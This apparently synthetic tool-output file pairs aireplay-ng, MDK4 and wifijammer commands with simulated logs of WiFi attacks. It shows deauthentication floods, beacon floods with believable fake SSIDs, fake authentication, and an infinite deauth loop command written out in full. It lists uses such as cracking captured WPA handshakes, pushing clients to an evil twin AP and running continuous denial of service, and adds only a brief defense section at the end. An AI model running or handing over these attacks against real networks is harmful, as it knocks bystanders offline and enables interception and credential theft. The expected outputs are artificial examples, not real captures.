name: wifi_deauth_dos
description: WiFi deauthentication attacks and denial of service using aireplay-ng

expected_output.example:
15:30:45  Waiting for beacon frame (BSSID: DD:EE:FF:00:11:22) on channel 6
15:30:46  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [0|0 ACKs]
15:30:47  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [0|3 ACKs]
15:30:48  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [1|5 ACKs]
15:30:49  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [2|8 ACKs]
15:30:50  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [3|11 ACKs]

Broadcast deauthentication attack:
  Target AP: DD:EE:FF:00:11:22 (OfficeMain)
  Deauth packets: 5 bursts
  Target: FF:FF:FF:FF:FF:FF (broadcast - all clients)
  Channel: 6
  
Deauth frame details:
  Code 7: Class 3 frame received from nonassociated station
  Effect: Forces all clients to disconnect
  Packets per burst: 64 frames
  ACKs: 11 acknowledged (some clients disconnected)
  
Result:
  All clients disconnected from OfficeMain
  Clients will attempt to reconnect
  
Use cases:
  - Capture WPA handshakes (clients reconnect → handshake)
  - Force clients to evil twin (our AP has stronger signal)
  - Denial of service (continuous deauth)

15:32:00  Waiting for beacon frame (BSSID: DD:EE:FF:00:11:22) on channel 6
15:32:01  Sending 64 directed DeAuth (code 7). STMAC: [AB:CD:EF:12:34:56] [0|1 ACKs]
15:32:02  Sending 64 directed DeAuth (code 7). STMAC: [AB:CD:EF:12:34:56] [1|2 ACKs]
15:32:03  Sending 64 directed DeAuth (code 7). STMAC: [AB:CD:EF:12:34:56] [2|3 ACKs]
15:32:04  Sending 64 directed DeAuth (code 7). STMAC: [AB:CD:EF:12:34:56] [3|4 ACKs]
15:32:05  Sending 64 directed DeAuth (code 7). STMAC: [AB:CD:EF:12:34:56] [4|5 ACKs]
[continues indefinitely...]

Targeted deauthentication (continuous):
  AP: DD:EE:FF:00:11:22
  Target client: AB:CD:EF:12:34:56 (specific MAC)
  Deauth count: 0 (infinite - runs forever)
  
Effect:
  - Only specified client disconnected
  - Other clients unaffected
  - Targeted denial of service
  
Continuous attack:
  --deauth 0 = infinite loop
  Prevents client from staying connected
  Client disconnects immediately upon each reconnect attempt
  
Use for handshake capture:
  1. Start airodump-ng capturing target AP
  2. Run targeted deauth on active client
  3. Client disconnects and reconnects
  4. Handshake captured during reconnection
  5. Stop deauth (Ctrl+C)
  6. Crack handshake with aircrack-ng
  
Targeted vs broadcast:
  Targeted: One specific client disrupted
  Broadcast: All clients disrupted

MDK4 v4.2 - WiFi Deauthentication Flood

Mode: Deauthentication flood on channel 6
Interface: wlan0mon

MDK4 deauth flood:
  Mode: Aggressive multi-target deauth
  Channel: 6
  Targets: All APs on channel 6 (3 found)
  
Attack pattern:
  - Auto-discovers all APs on channel
  - Deauths ALL clients of ALL APs
  - 256 packets per client
  - Repeats continuously
  
Effect:
  Complete WiFi disruption on channel 6
  All networks unusable
  All clients repeatedly disconnected
  
Packet rate: ~2,800 packets/second
  Very aggressive
  Effective denial of service
  
MDK4 vs aireplay-ng:
  MDK4: Automated, multi-target, aggressive
  aireplay: Manual, single target, precise
  
Other MDK4 modes:
  b: Beacon flood (fake APs)
  a: Authentication DoS  
  p: SSID probing
  m: Michael countermeasures

MDK4 v4.2 - Beacon Flood Mode

Loading SSIDs from: ssids.txt
SSIDs loaded: 500
Channel: 6
Speed: 1000 beacons/second

[15:38:00] Starting beacon flood...
[15:38:00] Broadcasting fake AP: FreeWiFi
[15:38:00] Broadcasting fake AP: Starbucks_WiFi
[15:38:00] Broadcasting fake AP: Airport_Guest
[15:38:00] Broadcasting fake AP: Hotel_Internet
[15:38:00] Broadcasting fake AP: CoffeeShop_Free

[15:38:01] Broadcasting fake AP: Guest_Network
[15:38:01] Broadcasting fake AP: xfinitywifi
[... 492 more SSIDs ...]

[15:38:02] Beacons sent: 2,000 | APs active: 500 | Rate: 1,000/s
[15:38:03] Beacons sent: 4,000 | APs active: 500 | Rate: 1,000/s
[15:38:04] Beacons sent: 6,000 | APs active: 500 | Rate: 1,000/s

Beacon flood attack:
  Fake SSIDs: 500 (from ssids.txt)
  Channel: 6
  Broadcast rate: 1,000 beacons/second
  
Effect on victims:
  - WiFi list flooded with hundreds of fake networks
  - Real networks hidden in the noise
  - Confusion and difficulty connecting
  - Device WiFi scans slow down
  - Some devices crash or freeze
  
SSID list (ssids.txt):
  Common names that look legitimate:
    - FreeWiFi, PublicWiFi, GuestNetwork
    - Coffee shop names (Starbucks, etc)
    - Hotel/Airport guest networks
    - Carrier networks (xfinitywifi, etc)
  
Generate SSID list:
  crunch 8 8 -o ssids.txt  # Random 8-char SSIDs
  Or use custom list of believable names
  
Beacon flood impact:
  - WiFi unusable (too much noise)
  - Real APs harder to find
  - Denial of service
  - Social engineering (fake SSIDs)

15:40:00  Waiting for beacon frame (BSSID: DD:EE:FF:00:11:22) on channel 6
15:40:01  Sending Authentication Request (Open System) [ACK]
15:40:01  Authentication successful
15:40:01  Sending Association Request [ACK]
15:40:02  Association successful :-)
15:40:02  Got a deauthentication packet! (Waiting 3 seconds)
15:40:05  Sending Authentication Request (Open System) [ACK]
15:40:05  Authentication successful
15:40:05  Sending Association Request [ACK]
15:40:05  Association successful :-)
15:40:35  Sending keep-alive packet [ACK]
15:41:05  Sending keep-alive packet [ACK]
15:41:35  Sending keep-alive packet [ACK]
[continues every 30 seconds...]

Fake authentication attack:
  AP: DD:EE:FF:00:11:22 (OfficeMain)
  Our MAC: 00:11:22:33:44:55 (spoofed)
  Keep-alive: Every 30 seconds
  
Authentication process:
  1. Send auth request to AP
  2. AP responds with auth success
  3. Send association request
  4. AP associates us as client
  5. Send keep-alive every 30s to stay connected
  
Use cases:
  - Prerequisite for injection attacks
  - ARP replay attacks need association
  - Fragmentation attacks
  - Some DoS techniques
  
Fake auth on open networks:
  Easy - no password needed
  Just associate with AP
  
Fake auth on WEP networks:
  Possible with shared-key auth
  Part of WEP cracking process
  
Fake auth on WPA/WPA2:
  NOT possible without password
  WPA handshake requires PSK
  This only works on open/WEP

WiFiJammer automated tool:
  Target: DD:EE:FF:00:11:22
  Mode: Targeted AP deauth
  Clients: Auto-discovered (5 found)
  
Automation features:
  - Auto-enables monitor mode
  - Auto-discovers AP clients
  - Deauths all clients continuously
  - Real-time stats
  - Vendor identification (Dell, Apple, etc)
  
Attack pattern:
  - 100 deauth packets per client
  - Rotates through all clients
  - Repeats indefinitely
  - Effective DoS
  
Comparison:
  aireplay-ng: Manual, flexible, precise
  MDK4: Aggressive, multi-target
  wifijammer: Automated, user-friendly, targeted
  
Use cases:
  - Quick targeted DoS
  - Testing client behavior during disconnection
  - Forcing handshake captures
  - Evil twin prep (force clients to rogue AP)

args: while true; do aireplay-ng --deauth 1 -a DD:EE:FF:00:11:22 wlan0mon; sleep 0.1; done

expected_output.example:
15:48:00  Sending 64 directed DeAuth. STMAC: [FF:FF:FF:FF:FF:FF] [ACK]
15:48:00  Sending 64 directed DeAuth. STMAC: [FF:FF:FF:FF:FF:FF] [ACK]
15:48:00  Sending 64 directed DeAuth. STMAC: [FF:FF:FF:FF:FF:FF] [ACK]
15:48:01  Sending 64 directed DeAuth. STMAC: [FF:FF:FF:FF:FF:FF] [ACK]
15:48:01  Sending 64 directed DeAuth. STMAC: [FF:FF:FF:FF:FF:FF] [ACK]
15:48:01  Sending 64 directed DeAuth. STMAC: [FF:FF:FF:FF:FF:FF] [ACK]
[repeats rapidly...]

Continuous rapid deauth loop:
  Target: DD:EE:FF:00:11:22 (broadcast to all clients)
  Deauth count: 1 (single burst)
  Delay: 0.1 seconds (100ms)
  Loop: Infinite (while true)
  
Attack rate:
  ~10 deauth bursts per second
  64 packets per burst
  ~640 deauth packets/second
  
Effect:
  - Extremely aggressive DoS
  - Clients cannot connect at all
  - Immediate disconnection upon any connection attempt
  - Network completely unusable
  
Victim experience:
  - WiFi shows as available
  - Connection attempts fail immediately
  - "Unable to connect" errors
  - Some devices may stop trying
  
Detection:
  - Massive deauth traffic visible in Wireshark
  - Abnormal disconnection rate in AP logs
  - All clients affected simultaneously
  
Defense:
  - 802.11w (Management Frame Protection)
  - Wireless IDS/IPS
  - MAC filtering (weak defense)
  - Physical security (limit attacker proximity)
